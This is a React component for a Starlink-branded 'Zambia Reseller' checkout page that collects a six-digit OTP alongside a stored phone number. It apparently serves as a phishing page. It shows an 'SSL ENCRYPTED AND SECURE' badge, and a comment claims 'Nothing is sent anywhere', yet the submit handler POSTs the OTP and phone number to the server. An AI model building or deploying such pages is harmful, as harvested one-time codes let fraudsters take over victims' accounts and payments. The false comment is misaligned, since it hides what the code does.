import { useEffect, useState } from "react";
import type { FormEvent } from "react";
import { useFetcher, useNavigate } from "react-router";
import { plans } from "./plansPage";

export default function OtpVerificationDemo() {
  const [otp, setOtp] = useState("");
  const [verified, setVerified] = useState(false);
  const [myplan, setMyplan] = useState<any>({});
    const [phone, setPhone] = useState<any>("");
    const fetcher = useFetcher();
    const navigate = useNavigate();

  const handleOtpChange = (
    event: React.ChangeEvent<HTMLInputElement>
  ) => {
    // Keep numbers only
    const value = event.target.value.replace(/\D/g, "");

    // Keep it to 6 digits
    setOtp(value.slice(0, 6));

    // Hide success message if user edits the OTP again
    setVerified(false);
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    await fetcher.submit({
      otp: otp,
      phone: phone
    }, {
      method: "POST"
    })

    navigate("/success")
    // IMPORTANT:
    // This is UI-only.
    // Nothing is sent anywhere.
   // console.log("Demo OTP:", otp);

    if (otp.length === 6) {
      setVerified(true);
    }
  };
 useEffect(() => {
    const planId = localStorage.getItem("selectedPlan") || 13;
    setMyplan(plans.find((plan) => plan.id === planId));
    setPhone(localStorage.getItem("phone"))
  }, [])
  return (
    <div className="min-h-screen bg-gray-50 pb-[72px] pt-[72px]">

      {/* ================= HEADER ================= */}

      <header className="fixed left-0 right-0 top-0 z-50 bg-black text-white shadow-sm">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4">

          <a href="/" className="flex items-center gap-2">
            <img
              src="/static/images/starlink_logo.png"
              alt="STARLINK"
              className="h-8"
            />

            <span className="ml-2 hidden border-l border-gray-600 pl-2 text-sm sm:inline">
              Zambia Reseller
            </span>
          </a>

          <nav className="hidden gap-6 md:flex">

            <a
              href="/dashboard/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-wifi" />
              <span>Status</span>
            </a>

            <a
              href="/plans/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-home" />
              <span>Plans</span>
            </a>

            <a
              href="/records/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-list-ul" />
              <span>Orders</span>
            </a>

          </nav>

        </div>
      </header>

      {/* ================= MAIN ================= */}

      <main className="mx-auto max-w-7xl px-4 py-8">

        <div className="mx-auto max-w-md">

          <div className="overflow-hidden rounded-3xl bg-white shadow">

            {/* ================= CARD HEADER ================= */}

            <div className="border-b border-gray-100 p-6">

              <div className="mb-6 flex items-center justify-between">

                <a
                  href="/sms/"
                  className="flex items-center text-sm font-bold text-gray-600"
                >
                  <i className="uil uil-arrow-left mr-1 text-xl" />
                  Back
                </a>

                <div className="text-right">

                  <p className="text-xs font-bold uppercase tracking-wider text-gray-400">
                    Amount
                  </p>

                  <p className="text-xl font-black text-orange-500">
                    ZMW {myplan?.price || 25.00}
                  </p>

                </div>

              </div>

              <h1 className="text-2xl font-black text-gray-900">
                OTP Verification
              </h1>

              <p className="mt-1 text-sm text-gray-500">
                Enter the demo OTP code below.
              </p>

            </div>

            {/* ================= CONTENT ================= */}

            <div className="space-y-6 p-6">

              {/* Sending To */}

              <div className="py-4 text-center">

                <p className="mb-1 text-xs font-bold uppercase tracking-widest text-gray-400">
                  Sending to
                </p>

                <p className="mt-2 font-bold text-gray-900">
                  {phone}
                </p>

              </div>

              {/* OTP Form */}

              <form
                onSubmit={handleSubmit}
                className="space-y-6"
              >

                <div className="space-y-2">

                  <label
                    htmlFor="otp_code"
                    className="ml-1 text-xs font-bold uppercase tracking-wider text-gray-400"
                  >
                    Enter OTP Code
                  </label>

                  <input
                    type="text"
                    id="otp_code"
                    name="otp_code"
                    value={otp}
                    onChange={handleOtpChange}
                    placeholder="••••••"
                    inputMode="numeric"
                    maxLength={6}
                    required
                    className="w-full rounded-2xl border-2 border-gray-100 bg-gray-50 px-5 py-4 text-center text-2xl font-black tracking-widest text-gray-900 placeholder-gray-300 outline-none transition-all focus:border-orange-500 focus:ring-4 focus:ring-orange-100"
                  />

                </div>

                {/* Digit Counter */}

                <div className="text-center text-xs font-medium text-gray-400">
                  {otp.length} / 6 digits
                </div>

                {/* Submit */}

                <button
                  type="submit"
                  disabled={otp.length !== 6 || fetcher.state !== "idle"}
                  className="flex w-full items-center justify-center gap-2 rounded-2xl bg-orange-500 py-5 font-black text-white shadow-lg shadow-orange-200 transition-all hover:bg-orange-600 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {fetcher.state === "submitting" ? (
                    <i className="uil uil-spinner-alt animate-spin" />
                  ) : (
                    <>
                  Verify & Complete

                  <i className="uil uil-check-circle text-xl" />
                    </>
                  )}
                </button>

              </form>

              

              {/* Security */}

              <div className="text-center">

                <p className="text-xs font-bold text-gray-400">

                  <i className="uil uil-shield-check mr-1 text-green-500" />

                  SSL ENCRYPTED AND SECURE

                </p>

              </div>

            </div>

          </div>

        </div>

      </main>

      {/* ================= BOTTOM NAVIGATION ================= */}

      <nav className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-200 bg-white shadow-2xl">

        <div className="mx-auto flex max-w-7xl items-center justify-around px-2 py-2 sm:px-4 sm:py-3">

          <a
            href="/dashboard/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-wifi text-2xl" />
            <span className="text-xs font-semibold">
              Status
            </span>
          </a>

          <a
            href="/plans/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-shopping-bag text-2xl" />
            <span className="text-xs font-semibold">
              Plans
            </span>
          </a>

          <a
            href="/records/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-list-ul text-2xl" />
            <span className="text-xs font-semibold">
              Orders
            </span>
          </a>

          <a
            href="#"
            className="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600"
          >
            <i className="uil uil-setting text-2xl" />
            <span className="text-xs font-semibold">
              Settings
            </span>
          </a>

        </div>

      </nav>

    </div>
  );
}